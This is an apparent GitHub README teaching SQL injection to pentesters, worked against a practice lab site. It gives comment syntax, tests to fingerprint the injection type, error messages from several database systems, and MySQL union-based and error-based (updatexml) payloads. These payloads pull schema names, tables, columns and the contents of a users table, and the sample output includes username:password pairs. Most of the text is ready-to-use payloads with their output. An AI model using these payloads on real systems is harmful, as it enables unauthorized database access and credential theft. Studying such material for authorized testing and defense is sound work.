# SQL Injections for Pentesters :syringe:

by: Eduardo Barbosa (@Anake)  :alien::smiling_imp::boom: 

email: anakein [@] protonmail [dot] ch

Hello my friends, this is my repo about sql injections. 

Thanks for all: Zenodermus Javanicus, @zc00l, @LowFuel 

References:

 https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
 
 http://www.securityidiots.com/Web-Pentest/SQL-Injection
 
 
LAB: http://leettime.net/sqlninja.com/index.php


```
select * from table_name where id=1337

select * from table_name where id='1337'

select * from table_name where id="1337"

select * from table_name where id=(1337)

select * from table_name where id=('1337')

select * from table_name where id=("1337")


+--------+-----------------------------------+
|Comment	|	      Name           | 
+--------+-----------------------------------+
|--	 :	MySQL Linux Style            |
|--+     :	MySQL Windows Style          |
|#	 :	Hash (URL encode while use)  |
|--+-	 :	SQL Comment                  |
|;%00	 :	Null Byte                    |
|`       :      Backtick                     |
+--------+-----------------------------------+

```

You need realize several tests, really this is tense but is necessary

```
+----------------------------------------------------------------+------------------------------------------------------------------------------+
|                     Injection                                  |             If it gives same Output as 23 was giving then                    |
+----------------------------------------------------------------+------------------------------------------------------------------------------+
|http://leettime.net/sqlninja.com/tasks/basic_ch1.php?id=1--     | Its intiger type injection and `--` can be used as comment                   |
|http://leettime.net/sqlninja.com/tasks/basic_ch1.php?id=1'--    | Its Single quote type injection and '--' can be used as comment              | 
|http://leettime.net/sqlninja.com/tasks/basic_ch1.php?id=1"--    | Its Double quote type injection and '--' can be used as comment              |
|http://leettime.net/sqlninja.com/tasks/basic_ch1.php?id=1)--    | Its intiger type with bracket injection and '--' can be used as comment      |
|http://leettime.net/sqlninja.com/tasks/basic_ch1.php?id=1')--   | Its Single quote with bracket type injection and '--' can be used as comment |
|http://leettime.net/sqlninja.com/tasks/basic_ch1.php?id=1")--   | Its Double quote with bracket type injection and '--' can be used as comment |
+----------------------------------------------------------------+------------------------------------------------------------------------------+

```

so as i showed above test for '--' type comment in the same manner you can check for all commenting types and the one which gives same output as giving with "http://leettime.net/sqlninja.com/tasks/basic_ch1.php?id=1" then that can help you understand the type of internal query alongwith the comment that you can use.

#### :heavy_exclamation_mark: Rules :heavy_exclamation_mark:

 Any time anywhere or any application where ever and whenever you are injecting there are following three basic rules of injecting!
 
[1]. Balance ⚖️

[2]. Inject :syringe:

[3]. Commenting 💬

![rules_for_injection](https://raw.githubusercontent.com/0xC2-0xC2/blackhat_sql_injections/master/injection_.jpg)

#### :heavy_exclamation_mark: Information IMPORTANT :heavy_exclamation_mark:
Remember whenever the input is enclosed with single quotes only single quote with input will create error.
When input is enlcosed by double quotes a double qoute with input will give error.
When Input is not enlcosed with anything single quote and double quote both will give error.

First of all we can try our input with some injections to see if we get any error. Error may always not be real SQL error it may be some times generic error or change in output of the application. All you have to do it recognise it. 

![MySQL](https://img.shields.io/badge/1-MySQL%20Error%20Style-critical)

`You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '\'' at line 1`

![mssql](https://img.shields.io/badge/2-MSSQL%20ASPX%20Error-critical)

`Server Error in '/' Application`

![MSAcess](https://img.shields.io/badge/3-MSAccess%20(Apache%20PHP)-critical)

`Fatal error: Uncaught exception 'com_exception' with message Source: Microsoft JET Database Engine`

![MSAccessIISaSp](https://img.shields.io/badge/4-MSAccesss%20(IIS%20ASP)-critical)

`Microsoft JET Database Engine error '80040e14'`

![oracle](https://img.shields.io/badge/5-Oracle%20Error-critical)

`ORA-00933: SQL command not properly ended`

![ORA](https://img.shields.io/badge/6-ODBC%20Error-critical)

`Microsoft OLE DB Provider for ODBC Drivers (0x80040E14)`

![postgree](https://img.shields.io/badge/7-PostgreSQL%20Error-critical)

`PSQLException: ERROR: unterminated quoted string at or near "'" Position: 1
or
Query failed: ERROR: syntax error at or near
"'" at character 56 in /www/site/test.php on line 121.`

![mssqlserver](https://img.shields.io/badge/8-MS%20SQL%20Server-critical)

`Microsoft SQL Native Client error %u201880040e14%u2019
Unclosed quotation mark after the character string`

Now i will show you different tests to create errors and confirm which query is working inside the Application while using the same example "http://leettime.net/sqlninja.com/tasks/basic_ch1.php?id=1" url, You can perform these tests and check the reactions of the application:

```
+---------------------------+-------------------------------------------------------------------------------------+
|Input	                    | 	Reaction if its Intiger Based Injection                                           |
+---------------------------+-------------------------------------------------------------------------------------+
|23'                        :   It should cause error or no output                                                |
|"	                    :	Should cause error or no output                                                   |
|23 or 1=1	            :	Any Output should come but may be different output                                |
|23 and 1=1	            :	Same output should come                                                           |
|23 and false	            :	No output                                                                         |
|23 and true	            :	Same Output                                                                       |
|23--+	                    :	Same output. I used --+ to comment, later i ll show how to know which one to use  |
|23 and true--+	            :	Same output                                                                       |
+-----------------------------------------------------------------------------------------------------------------+
```


## MYSQL Union Based

### Extract database with information_schema

First you need to know the number of columns, you can use `order by`

```sql
order by 1
order by 2
order by 3
...
order by XXX
```

OR

`1' order by 1,2,3%23`



Then the following codes will extract the databases'name, tables'name, columns'name.

#### :heavy_exclamation_mark: Various methods to make a QUERY INVALID  - Remember to use URL Encoded. :heavy_exclamation_mark:

```

http://leettime.net/sqlninja.com/tasks/basic_ch1.php?id=1' and 0 union select 1,@@version,3--+

http://leettime.net/sqlninja.com/tasks/basic_ch1.php?id=1' and false union select 1,@@version,3--+

http://leettime.net/sqlninja.com/tasks/basic_ch1.php?id=-1' union select 1,@@version,3--+

http://leettime.net/sqlninja.com/tasks/basic_ch1.php?id=1000000' union select 1,@@version,3--+

http://leettime.net/sqlninja.com/tasks/basic_ch1.php?id=null' union select 1,@@version,3--+

http://leettime.net/sqlninja.com/tasks/basic_ch1.php?id=1' && 0 union select 1,@@version,3--+

```

#### Extract DATABASE NAME

`1' UniOn Select 1,gRoUp_cOncaT(0x7c,schema_name,0x7c),3+fRoM+information_schema.schemata%23`

OUTPUT:     leettime_761wHole

#### Extract TABLES NAME  

`1' UniOn Select 1,gRoUp_cOncaT(0x7c,table_name,0x7C),3+fRoM+information_schema.tables+wHeRe+table_schema=database()%23`

OUTPUT:     |testtable1|,|userlogs|,|users|

#### Extract COLUMNS NAME

>>> REMEMBER USE SINGLE QUOTE  

```

In mysql there is a particularity

String inside strings duplicate quotes!

' blablabla ''string'' '

String >> string >> string

'blablabla '' blablabla '''' string '''' '' '

This used with frequency in mysql links.

```


`1' UniOn Select 1,gRoUp_cOncaT(0x7c,column_name,0x7C),3+fRoM+information_schema.columns+wHeRe+table_name='users'%23`

OUTPUT:    |id|,|username|,|password|,|user_type|,|sec_code|  

#### EXTRACT DATA

`1' union Select all 1,group_concat(0x7c,username,0x3a,password,0x7c),3 from users%23`

OUTPUT: |injector:khan|,|decompiler:hacktract|,|devilhunte:dante|,|Zen:sec-idiots|,|Zenodermus:security-i|,|grayhat:hacker|,|khan:haxor|,|admin:sadmin|

OR you can add limit using the `limit 0,1`, `limit 1,1`, `limit 2,1`...

`1' union Select 1,concat(username,0x3a,password),3 from users limit 2,1%23`

OUTPUT: decompiler:hacktract

## MYSQL Error Based

find errors, and interpreter. For example:

```
1'   out: 1' limit 1'
1/   out: error
1*   out: error
1--  out: no error  (Booowww)
1-- -  out: no error

Continue

1 and true;-- -    out: no error [Normal page]
1 and false;-- -   out: Invalid Input parameter [Error page]
```

##### Finding out the number of columns

```
1 order by 7-- -   out: error (Unknown column '7' in 'order clause')
1 order by 5-- -   out: no error  (us have 5 columns)

```

##### First lets try Union Based Injection.

`1 union select 1,2,3,4,database() -- -`   #No erro (loadpage normally)

Remember to invalidate the first input as i did by making it `-1`

`-1 union select 1,2,3,4,database() -- -`

OUTPUT: Username is : 2

2 is reference to the injectable field

`-1 union select 1,database(),3,4,5 -- -`

OUTPUT: Username is : leettime_761wHole







### UpdateXML function

`AND updatexml(rand(),concat(CHAR(126),version(),CHAR(126)),null)--`

OUTPUT: Error While Selection process : XPATH syntax error: '~5.6.44-cll-lve~'
